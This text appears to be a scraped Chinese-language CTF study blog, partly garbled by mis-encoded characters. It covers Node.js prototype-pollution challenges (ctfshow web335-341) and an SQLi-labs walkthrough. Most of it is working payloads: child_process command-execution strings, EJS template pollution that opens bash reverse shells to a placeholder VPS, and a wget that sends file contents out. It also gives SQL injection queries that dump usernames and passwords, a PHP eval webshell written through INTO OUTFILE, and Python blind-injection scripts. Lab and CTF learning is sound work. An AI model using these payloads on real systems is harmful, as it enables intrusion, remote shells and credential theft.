Son.prototype = new Father() let son = new Son()son.__ptoto__[lat_name] = hello;let secondson = new Son();console.log(`son Name:$son.last_name`);console.log(`secondson Name:$secondson.last_name`);-son Name: hello-second Name: hello let foo = bar:1foo.__proto__.bar = require(\\child_process\\).execSync(\\calc\\);let zoo = eval(zoo.bar) hero.name: é”é›¯,__proto__.block: type: Text,line:process.mainModule.require(child_process).execSync(wget ip:port/`cat /*f*`)hero.name: é”é›¯,__proto__: hero.name: return e = for (var a in ) delete Object.prototype[a]; return global.process.mainModule.constructor._load(child_process).execSync(id) ä¾‹é¢˜ï¼šnode.jsä»£ç å®¡è®¡ [è¥¿æ¹–è®ºå‰‘ 2022]Node Magical Loginconst fs = require(fs);const SECRET_COOKIE = process.env.SECRET_COOKIE || this_is_testing_cookieconst flag1 = fs.readFileSync(/flag1)const flag2 = fs.readFileSync(/flag2)function LoginController(req,res) try const username = req.body.username const password = req.body.password if (username !== admin || password !== Math.random().toString()) res.status(401).type(text/html).send(Login Failed) else res.cookie(user,SECRET_COOKIE) res.redirect(/flag1) catch (__) function CheckInternalController(req,res) res.sendFile(check.html,root:static)function CheckController(req,res) let checkcode = req.body.checkcode?req.body.checkcode:1234; console.log(req.body) if(checkcode.length === 16) try checkcode = checkcode.toLowerCase() if(checkcode !== aGr5AtSp55dRacer) res.status(403).json(msg:Invalid Checkcode1: + checkcode) catch (__) res.status(200).type(text/html).json(msg:You Got Another Part Of Flag: + flag2.toString().trim()) else res.status(403).type(text/html).json(msg:Invalid Checkcode2: + checkcode) function Flag1Controller(req,res) try if(req.cookies.user === SECRET_COOKIE) res.setHeader(This_Is_The_Flag1,flag1.toString().trim()) res.setHeader(This_Is_The_Flag2,flag2.toString().trim()) res.status(200).type(text/html).send(Login success. Welcome,admin!) if(req.cookies.user === admin) res.setHeader(This_Is_The_Flag1, flag1.toString().trim()) res.status(200).type(text/html).send(You Got One Part Of Flag! Try To Get Another Part of Flag!) else res.status(401).type(text/html).send(Unauthorized) catch (__) module.exports = LoginController, CheckInternalController, Flag1Controller, CheckController const express = require(express)const fs = require(fs)const cookieParser = require(cookie-parser);const controller = require(./controller)const app = express();const PORT = Number(process.env.PORT) || 80const HOST = 0.0.0.0app.use(express.urlencoded(extended:false))app.use(cookieParser())app.use(express.json())app.use(express.static(static))app.post(/login,(req,res) = controller.LoginController(req,res))app.get(/,(res) = res.sendFile(__dirname,static/index.html))app.get(/flag1,(req,res) = controller.Flag1Controller(req,res))app.get(/flag2,(req,res) = controller.CheckInternalController(req,res))app.post(/getflag2,(req,res)= controller.CheckController(req,res))app.listen(PORT,HOST,() = console.log(`Server is listening on Host $HOST Port $PORT.`)) web335ä½¿ç”¨jsé‡Œçš„evalæ‰§è¡Œå‘½ä»¤ 1.require(child_process).execSync(cat f*) ?eval=require(child_process)[exe%2BcSync](ls) ç»•è¿‡å¯¹execçš„é™åˆ¶ 2.require(child_process).spawnSync(ls,[.]).stdout.toString() require(child_process).spawnSync(cat,[fl001g.txt]).stdout.toString() 3.global.process.mainModule.constructor._load(child_process).execSync(ls,[.]).toString() require æ˜¯ Node.js ä¸­ç”¨æ¥å¼•å…¥æ¨¡å—çš„å‡½æ•°ï¼Œåœ¨è¿™é‡Œå¼•ç”¨äº†Node.jsçš„child_processæ¨¡å—child_process æ¨¡å—æ˜¯ Node.js æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œå®ƒæä¾›äº†åˆ›å»ºå­è¿›ç¨‹çš„åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡å®ƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€shell è„šæœ¬ç­‰ã€‚å…¶ä¸­åŒ…å«æœ‰spawnSync()æ–¹æ³•ï¼ŒspawnSyncå‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤spawnSync(â€˜lsâ€™,[â€˜.â€™]) å‰é¢ä»£è¡¨å‘½ä»¤ï¼Œåé¢æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œè¿™é‡Œçš„ . ä»£è¡¨ç€å½“å‰ç›®å½•ï¼Œ â€¦ ä»£è¡¨ä¸Šä¸€çº§ç›®å½• â€¦/â€¦ ä»£è¡¨ä¸Šä¸Šçº§ç›®å½•è¿™ä¸­é—´ç”¨äºè¿æ¥çš„ä¸¤ä¸ªç‚¹æ˜¯ç”¨æ¥è®¿é—®å¯¹è±¡å±æ€§çš„stdoutâ€™æ˜¯ä¸€ä¸ªç¼“å†²åŒºï¼Œå®ƒåŒ…å«äº†å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´è¾“å‡ºçš„å†…å®¹åœ¨è¿™é‡ŒtoString()è½¬æ¢ä¸ºå­—ç¬¦ä¸² web36è¿‡æ»¤äº†loadå’Œexec ä½¿ç”¨ä¸Šä¸€æ¬¡é‚£ä¸ªå‘½ä»¤å°±å¥½ web337var express = require(express);var router = express.Router();var crypto = require(crypto);function md5(s) return crypto.createHash(md5) .update(s) .digest(hex);/* GET home page. */router.get(/, function(req, res, next) res.type(html); var flag=xxxxxxx; var a = req.query.a; var b = req.query.b; if(a b a.length===b.length a!==b md5(a+flag)===md5(b+flag)) res.end(flag); else res.render(index, msg: tql); );module.exports = router; 1.ä¼ å…¥a[]1b[]2 a=x:1b=x:2 web338åŸºç¡€åŸå‹é“¾æ±¡æŸ“ var express = require(express);var router = express.Router();var utils = require(../utils/common); /* GET home page. */router.post(/, require(body-parser).json(),function(req, res, next) res.type(html); var flag=flag_here; var secert = ; var sess = req.session; let user = ; utils.copy(user,req.body); if(secert.ctfshow===36dboy) res.end(flag); else return res.json(ret_code: 2, ret_msg: ç™»å½•å¤±è´¥+JSON.stringify(user)); ); module.exports = router; module.exports = copy:copy;function copy(object1, object2) for (let key in object2) if (key in object2 key in object1) copy(object1[key], object2[key]) else object1[key] = object2[key] payload: username:11,password:11,__proto__:ctfshow:36dboy//å°±æ˜¯é€šè¿‡è¿™ä¸ªæ¥æ”¹å˜æˆå‘˜å±æ€§ secretçš„çˆ¶ç±»éƒ½æœ‰ctfshowè¿™ä¸ªå¯¹è±¡ äºæ˜¯ä»–ä¹Ÿæœ‰ web339EjsåŸå‹é“¾æ±¡æŸ“EJSæ˜¯ä¸€ä¸ªjavascriptæ¨¡æ¿åº“ï¼Œç”¨æ¥ä»jsonæ•°æ®ä¸­ç”ŸæˆHTMLå­—ç¬¦ä¸² % code %ç”¨æ¥æ‰§è¡Œjavascriptä»£ç  å…¶å®å’Œsstiå·®ä¸å¤š ä¸è¿‡sstiæ˜¯\\æ‰§è¡Œpythonä»£ç  é¢„æœŸè§£ å˜é‡è¦†ç›–åœ¨loginä¸‹post __proto__:query:return global.process.mainModule.constructor._load(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\) ç„¶åå†è®¿é—®api å¤šå°è¯•å‡ æ¬¡ ç›‘å¬åˆ°ç„¶årceæ‰¾flag åŸç†ï¼šå…¶å®è¿˜æ˜¯å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ objectå¯ä»¥è¢«å­ç±»ç»§æ‰¿ ä»¿ç…§é¢˜ç›®ä»£ç çš„å°demo function copy(object1, object2) for (let key in object2) if (key in object2 key in object1) copy(object1[key], object2[key]) else object1[key] = object2[key] user = body = JSON.parse(__proto__:query:return 2233);copy(user, body) query: Function(query)(query)//ä¼šè¾“å‡º query: 2233 /*é¦–å…ˆçœ‹çœ‹ query å€¼æ˜¯å¦‚ä½•è¢«æ”¹å˜çš„ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ web338 çš„åŸå‹é“¾æ±¡æŸ“ï¼Œå³ JS ä¸­æ‰€æœ‰çš„å¯¹è±¡çš„åŸå‹éƒ½å¯ä»¥ç»§æ‰¿åˆ° Objectï¼Œç„¶åç»ˆç‚¹æ˜¯ null å¯¹è±¡*/ éé¢„æœŸè§£ ejsæ¨¡æ¿æ¼æ´__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2 ç›´æ¥åœ¨Â·loginç›®å½•Â·ä¼ Â·è¿™ä¸ªÂ·payloadå°±Â·ok ç›‘å¬1234ç«¯å£å°±å¥½ web340è¿™ä¸ªé¢˜å°±æ˜¯Â·è¦è¿›è¡Œä¸¤æ¬¡æ±¡æŸ“å…³é”®ä»£ç  var express = require(express);var router = express.Router();var utils = require(../utils/common);/* GET home page. */router.post(/, require(body-parser).json(),function(req, res, next) res.type(html); var flag=flag_here; var user = new function() this.userinfo = new function() this.isVIP = false; this.isAdmin = false; this.isAuthor = false; ; utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin) //æ±¡æŸ“ä¸¤æ¬¡Â·æ‰å¯ä»¥Â·æ­£ç¡®Â· res.end(flag); else return res.json(ret_code: 2, ret_msg: ç™»å½•å¤±è´¥); );module.exports = router; payload:__proto__:__proto__:query:return global.process.mainModule.constructor._load(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\) ä¹Ÿæ˜¯å…ˆåœ¨loginè·¯ç”± ç„¶åè®¿é—®apiè·¯ç”± web341__proto__:__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2 __proto__:__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2","tags":["CTFå­¦ä¹ "]},{"title":"Sql-labséƒ¨åˆ†é¢˜è§£","path":"/2025/04/06/Sql-labséƒ¨åˆ†é¢˜è§£/","content":"level-1å­—ç¬¦å‹ â€˜æ³¨å…¥ -1 union select 1,2,group_concat(username,id,password) from users--+ å”¯ä¸€æ³¨æ„ç‚¹å°±æ˜¯æŸ¥è¯¢æ—¶è¦ç”¨-1 å› ä¸ºæˆ‘ä»¬è¦å¾—åˆ°unionåçš„ç»“æœ level-2æ•°å­—å‹æ³¨å…¥ åé¢è¿‡ç¨‹å’Œlevel-1ä¸€æ · -1 union select 1,2,group_concat(username,id,password) from users--+ level-3è¾“å…¥1â€™ å›æ˜¾ä¸­æœ‰ä¸ª) è¯´æ˜sqlè¯­å¥é‡Œæœ‰() è€ƒè™‘åŠ å…¥) ä¸å‰é¢çš„( æ„æˆé—­åˆ 1â€™ ) â€“+æ„é€ é—­åˆæˆåŠŸ åé¢ä¸level-1 level-2 ä¸€æ · -1) union select 1,2,group_concat(username,id,password) from users--+ level-4åŒå¼•å·å’Œæ‹¬å·æ„é€ é—­åˆ -1) union select 1,2,group_concat(username,id,password) from users--+ level-51â€™ â€“+ æ²¡æœ‰å›æ˜¾ é‡‡ç”¨æŠ¥é”™æ³¨å…¥ 1 and updatexml(1,concat(0x7e,database()),1) --+ #çˆ†å‡ºæ•°æ®åº“ 1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=security),1,32)),1)--+ 1 and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=security and table_name=users),1,32)),1) --+ 1 and updatexml(1,concat(0x7e,substr((select group_concat(username,id,password) from users),1,30)),1) --+#è¿™é‡Œå›æ˜¾çš„å¹¶éå…¨éƒ¨å†…å®¹ 1 and updatexml(1,concat(0x7e,(select username from users limit ,1)),1) --+1 and updatexml(1,concat(0x7e,(select username from users limit 1,1)),1) --+#ç”¨limitä¸€ä¸ªä¸€ä¸ªçœ‹å­—æ®µå†…å®¹ æŠ¥é”™æ³¨å…¥åŸç†MySQLæä¾›äº†ä¸€ä¸ª updatexml() å‡½æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°åŒ…å«ç‰¹æ®Šç¬¦å·æ—¶ä¼šæŠ¥é”™ï¼Œå¹¶å°†ç¬¬äºŒä¸ªå‚æ•°çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬äºŒä¸ªå‚æ•°æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•æ„Ÿæ•°æ®ã€‚ updatexml()å‡½æ•°updatexml(xml_doument,XPath_string,new_value)ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXMLçš„å†…å®¹ç¬¬äºŒä¸ªå‚æ•°ï¼šæ˜¯éœ€è¦updateçš„ä½ç½®XPATHè·¯å¾„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šæ˜¯æ›´æ–°åçš„å†…å®¹æ‰€ä»¥ç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥éšä¾¿å†™ï¼Œåªéœ€è¦åˆ©ç”¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»–ä¼šæ ¡éªŒä½ è¾“å…¥çš„å†…å®¹æ˜¯å¦ç¬¦åˆXPATH é•¿åº¦é™åˆ¶updatexml() å‡½æ•°çš„æŠ¥é”™å†…å®¹é•¿åº¦ä¸èƒ½è¶…è¿‡32ä¸ªå­—ç¬¦ï¼Œè§£å†³æ–¹å¼æœ‰ä¸¤ç§ï¼š 1.limit åˆ†é¡µ ?id=-1 and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) --+ 2.substr()æˆªå–å­—ç¬¦ ?id=-1 and updatexml(1,concat(0x7e,substr((select group_concat(user)from mysql.user), 1 , 31)),3) --+ æ„æ€ä¸ºä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æˆªå–31ä¸ªå­—ç¬¦ level-6å’Œlevel-5ç±»ä¼¼ ä¸è¿‡æ˜¯â€é—­åˆ 1 and updatexml(1,concat(0x7e,substr((select group_concat(username,id,password) from users),1,30)),1) --+ level-7è€ƒç‚¹ï¼šsqlå†™å…¥æ–‡ä»¶å†™å…¥æ¡ä»¶ï¼šæƒé™ä¸ºrootã€çŸ¥é“ç½‘ç«™çš„ç‰©ç†è·¯å¾„ã€secure_file_privç©º secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqldä¸å…è®¸å¯¼å…¥|å¯¼å‡ºsecure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqldçš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqldçš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ æ³¨æ„ç‚¹ï¼šè¦çŸ¥é“webè·¯å¾„ EX: D:\\phpstudy_pro\\WWW\\a.txt #æ–‡ä»¶è·¯å¾„ä¸èƒ½ä½¿ç”¨åæ–œçº¿\\ï¼Œè¦ä½¿ç”¨æ–œçº¿ æ–‡ä»¶å†…å®¹å¯ä»¥æ˜¯ä¸€å¥è¯æœ¨é©¬ç­‰ è¯»æ–‡ä»¶ï¼šload_file è¯»å–æ–‡ä»¶å†…å®¹ load_file(â€˜varwwwhtmlflag.phpâ€™) rootæƒé™åœ¨å·²çŸ¥ç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹ å†™æ–‡ä»¶ç”¨æ³•ï¼šinto outfile(å¯ä»¥å†™å…¥å¤šè¡Œï¼ŒæŒ‰æ ¼å¼è¾“å‡º) into dumpfile(å†™å…¥å•è¡Œæ²¡æœ‰è¾“å‡ºæ ¼å¼) 1)) union select 1,?php @eval($_POST[attack]);?,3 into outfile D:\\\\phpstudy_pro\\\\WWW\\\\aaa.php --+ æŸ¥çœ‹ç›®å½•å­˜åœ¨aaa.phpæˆ–è€…èœåˆ€èƒ½è¿ä¸Šå°±æˆåŠŸ level_8å¸ƒå°”ç›²æ³¨ï¼šå†™è„šæœ¬ï¼ import requestsurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-8/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 mid = (low + high) // 2 while low high: payload = 1 and ascii(substr((select database()),%d,1)) %d-- % (i,mid) #--åé¢è¦åŠ ç©ºæ ¼å“¦ params = id: payload r = requests.get(url, params=params) if You are in........... in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32: break name = name + chr(mid) print(name)get_database(url)payload2:1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)) %d-- payload3:1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),%d,1)) %d-- payload4:1 and ascii(substr((select group_concat(username,id,password) from users),%d,1)) %d-- ////import requestsimport timeurl= database =#payload1 = ?stunum=1^(ascii(substr((select(database())),,1)))^1#payload2 = ?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=ctf)),,1)))^1#payload3 =?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=flag)),,1)))^1#payload4 = ?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),,1)))^1for i in range(1,10000): low = 32 high = 128 mid =(low + high) // 2 while(low high): # payload = payload1.format(i,mid) #æŸ¥åº“å # payload = payload2.format(i,mid) #æŸ¥è¡¨å # payload = payload3.format(i,mid) #æŸ¥åˆ—å #payload = payload4.format(i,mid) new_url = url + payload r = requests.get(new_url) time.sleep(0.1) print(new_url) if Hi admin, your score is: 100 in r.text: low = mid + 1 else: high = mid mid = (low + high) //2 if (mid == 32 or mid == 132): break database +=chr(mid) print(database)print(database) import requests#è°ƒç”¨è¯·æ±‚æ¨¡å—import time#è°ƒç”¨æ—¶é—´æ¨¡å—import re#è°ƒç”¨è§„åˆ™è¡¨è¾¾å¼æ¨¡å—url=http://9819e874-b0cf-49cd-91b3-4aa443e1b27a.node5.buuoj.cn:81/#é¢˜ç›®é“¾æ¥flag = #åˆ›å»ºä¸€ä¸ªå˜é‡ç”¨æ¥å­˜æ”¾flagå€¼for i in range(1,50): #forå¾ªç¯éå†ï¼Œiè¡¨ç¤ºflagå€¼å¤§è‡´é•¿åº¦æ˜¯50ä»¥å†… max = 127 #èµ‹å€¼127 min = 0 #èµ‹å€¼0 for c in range(0,127): #forå¾ªç¯éå† s = (int)((max+min)/2) #é¦–å…ˆå°† max å’Œ min ç›¸åŠ ï¼Œç„¶åé™¤ä»¥ 2ï¼Œæœ€åå°†ç»“æœå¼ºåˆ¶è½¬æ¢ä¸ºæ•´æ•°ç±»å‹ã€‚ payload = 1^(ascii(substr((select(flag)from(flag)),+str(i)+,1))+str(s)+) #^å¼‚æˆ–è¿ç®—ç¬¦ï¼Œç›¸åŒä¸ºå‡ï¼Œä¸ç›¸åŒä¸ºçœŸï¼Œ1^payloadï¼Œè‹¥ä¸ºpayloadç»“æœä¸ºå‡ï¼Œåˆ™è¿”å›0ï¼Œ1^0=1ï¼Œå°†å¾—åˆ°æŸ¥è¯¢id=1æ—¶çš„ç»“æœï¼Œå›æ˜¾Hello, glzjin wants a girlfriendã€‚ #ä»flagæ•°æ®è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªåä¸ºflagçš„å­—æ®µï¼Œç„¶åå–è¿™ä¸ªå­—æ®µçš„å­—ç¬¦ä¸²ï¼ˆä»ä½ç½® +str(i)+ å¼€å§‹ï¼Œé•¿åº¦ä¸º 1ï¼ˆæ¯æ¬¡åªè¿”å›ä¸€ä¸ªï¼‰ï¼‰ #å°†è¿™ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII ç ï¼Œç„¶ååˆ¤æ–­è¿™ä¸ª ASCII ç æ˜¯å¦å¤§äºä¸€ä¸ªåä¸º s çš„å˜é‡ã€‚ r = requests.post(url,data = id:payload) #requestsæ¨¡å—çš„è¿ç”¨ï¼Œå°†payloadèµ‹å€¼ç»™é¢˜ç›®ä¸­è¿™ä¸ªåä¸ºidçš„å‚æ•° time.sleep(0.005) #æ¯å¾ªç¯ä¸€æ¬¡ä¼‘çœ 0.005ç§’ if Hello in str(r.content): #å¦‚æœHelloè¿™ä¸ªå­—ç¬¦ä¸²åœ¨ç”Ÿæˆçš„ç»“æœä¸­ï¼Œé‚£ä¹ˆå°±ç»§ç»­å‘ä¸‹è¿›è¡Œ max=s #å°†sçš„å€¼èµ‹å€¼ç»™max else: #åä¹‹ min=s #å°†sçš„å€¼èµ‹å€¼ç»™min if((max-min)=1): #å¦‚æœmax-minçš„å€¼ flag+=chr(max) #å°†maxçš„ASCIIå€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸² print(flag) #è¾“å‡ºflag break #è·³å‡ºå¾ªç¯ level_9æ—¶é—´ç›²æ³¨ï¼šå†™è„šæœ¬ï¼ 1â€™ and if(length(database())1,sleep(5),1)â€“+ #å¯ä»¥æŸ¥çœ‹é—­åˆæ˜¯ä¸æ˜¯æ­£ç¡®çš„ é—­åˆæ­£ç¡®ç½‘é¡µå°±ä¼šç¡5ç§’ IFè¯­æ³•è¯­æ³•ï¼šIF(condition, value_if_true, value_if_false)conditionæ˜¯ä¸€ä¸ªæ¡ä»¶è¡¨è¾¾å¼ï¼Œå¦‚æœæ¡ä»¶æˆç«‹ï¼Œåˆ™è¿”å›value_if_trueï¼Œå¦åˆ™è¿”å›value_if_falseã€‚ import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-9/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 mid = (low + high) // 2 while low high: payload = 1 and if(ascii(substr(database(), %d, 1)) %d, sleep(1), 0)-- % (i, mid) params = id: payload start_time = time.time() r = requests.get(url, params=params) end_time = time.time() if end_time - start_time = 1: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32: break name = name + chr(mid) print(name)get_database(url) payload2:1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1)) %d, sleep(0.5), 0)-- payload3:1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()), %d, 1)) %d, sleep(0.5), 0)-- payload4:1 and if(ascii(substr((select group_concat(username,id,password) from users), %d, 1)) %d, sleep(0.5), 0)-- level_101â€™ and if(length(database())1,sleep(5),1)â€“+ #æ²¡ç¡ 1â€ and if(length(database())1,sleep(5),1)â€“+ #å»¶è¿Ÿäº† è¯´æ˜é—­åˆæ–¹å¼æ˜¯â€ ç„¶åç›²æ³¨ æ–¹å¼å’Œlevel_9ä¸€æ · level_11â€˜é—­åˆ level_12é—­åˆæ–¹å¼â€) 1â€) union select 1,database()# ç±»ä¼¼ æ­£å¸¸è”åˆæ³¨å…¥ level_13é—­åˆæ–¹å¼â€™) ç„¶ååªä¼šå›æ˜¾æˆåŠŸç™»å½• å°è¯•ä¸‹æŠ¥é”™æ³¨å…¥ æˆåŠŸäº† å°±æŠ¥é”™æ³¨å…¥æ­£å¸¸åš level_14â€œé—­åˆ æŠ¥é”™æ³¨å…¥æ­£å¸¸æ³¨å…¥ level_15import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-15/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = admin and if(ascii(substr(database(), %d, 1)) %d, sleep(0.5), 0)# % (i, mid) params = uname: payload, passwd: admin, submit: Submit start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 0.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) ç„¶åæ­£å¸¸ç›²æ³¨ level_16import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-16/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = admin\\) and if(ascii(substr(database(), %d, 1)) %d, sleep(0.5), 0)# % (i, mid) params = uname: payload, passwd: admin, submit: Submit start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 0.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) ä»¥æ­¤ç±»æ¨ level_17æŠ¥é”™æ³¨å…¥orç›²æ³¨ ä¸å¤šå†™ æŠ¥é”™æ³¨å…¥ç±»å‹è¡¥å……extractvalueæŠ¥é”™æ³¨å…¥extractvalue(XML_document,XPath_string) åªæœ‰ä¸¤ä¸ªå‚æ•° 1 and extractvalue(1,concat(0x7e,database()))#1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#ä»¥æ­¤ç±»æ¨ flooræŠ¥é”™æ³¨å…¥1 and (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+ 1 and (select 1 from (select count(*),concat(0x23,(select column_name from information_schema.columns where table_schema=security and table_name=emails limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+ levle_18user_agentæ³¨å…¥ æŠ¥é”™æ³¨å…¥ level_19refereræ³¨å…¥ æŠ¥é”™æ³¨å…¥ level_20cookieæ³¨å…¥ æŠ¥é”™æ³¨å…¥ å’Œå‰æ–‡å·®ä¸å¤š level_21cookieæ³¨å…¥ ä¸è¿‡å†™å…¥çš„payloadéœ€è¦base64ç¼–ç  level_22cookieæ³¨å…¥ ä¸è¿‡é—­åˆæ–¹å¼ä»â€™ - â€œ ä»ç„¶è¦ç¼–ç  level_23è€ƒç‚¹ï¼šè¿‡æ»¤# â€“+ å¯ä»¥è€ƒè™‘ç”¨ä¸€ä¸ªè¡¨è¾¾å¼æ„é€ é—­åˆ -1 union select 1,database(),3 and 1 = 1-1 union select 1,database(),3 or 1 = 1#ç¬¬ä¸€ä¸ªå’Œsqlè¯­å¥çš„ç¬¬ä¸€ä¸ªæ„æˆé—­åˆ payloadå°¾çš„1å’Œsqlè¯­å¥çš„æ„æˆé—­åˆ ä½¿1=1æˆç«‹ å®Œç¾çš„ä¸ç”¨æ³¨é‡Šç¬¦å·å°±æ„é€ äº†é—­åˆæœ€åè¯­å¥ï¼š-1 union select 1,(select group_concat(username,id,password) from users),3 and 1 = 1 å…¶å®ä¹Ÿå¯ä»¥æŠŠè¡¨è¾¾å¼æ›¿æ¢ä¸ºâ€™ -1 union select 1,database(),3 level_24è€ƒç‚¹ï¼šäºŒæ¬¡æ³¨å…¥ äºŒæ¬¡æ³¨å…¥çš„åŸç†ï¼šåœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº† addslashes æˆ–è€…æ˜¯å€ŸåŠ© get_magic_quotes_gpcå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«è¿˜æ˜¯è„æ•°æ®ã€‚ åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚ è¿‡ç¨‹:å…ˆæ„é€ æ¶æ„è¯­å¥ ç„¶åå­˜å…¥æ•°æ®åº“ ç„¶åç¬¬äºŒæ¬¡æ„é€ è¯­å¥ è¿‡ç¨‹é¦–å…ˆæ³¨å†Œadminâ€™#å¸å· 123456 ç„¶åä¿®æ”¹adminâ€™#çš„å¯†ç  ä½†æ˜¯å®é™…ä¸Šä¿®æ”¹çš„æ˜¯adminçš„å¯†ç  #åŸè¯­å¥UPDATE users SET PASSWORD=$pass where username=$username and password=$curr_pass #æ’å…¥ payload åçš„è¯­å¥UPDATE users SET PASSWORD=$pass where username=admin# and password=$curr_pass#æ­¤æ—¶ admin åçš„è¯­å¥è¢«æ³¨é‡Š #çœŸæ­£çš„ç”Ÿæ•ˆçš„è¯­å¥UPDATE users SET PASSWORD=$pass where username=admin#ä»è€Œè¾¾åˆ°äº†ä¿®æ”¹ç”¨æˆ· admin å¯†ç çš„ç›®çš„ level_25å°†orå’Œandæ›¿æ¢ä¸ºç©º oorr aandnd ç„¶åæ­£å¸¸æ³¨å…¥ level_26è¿‡æ»¤äº†ç©ºæ ¼ æ³¨é‡Šç¬¦ or and * å’Œ\\ ç©ºæ ¼ç”¨()ä»£æ›¿ æ³¨é‡Šç¬¦é€šè¿‡è¡¨è¾¾å¼æˆ–ç¬¦å·æ„é€ é—­åˆ orå’Œandå¯ä»¥åŒå†™ç»•è¿‡ è¿˜å¯ä»¥ä½¿ç”¨|| 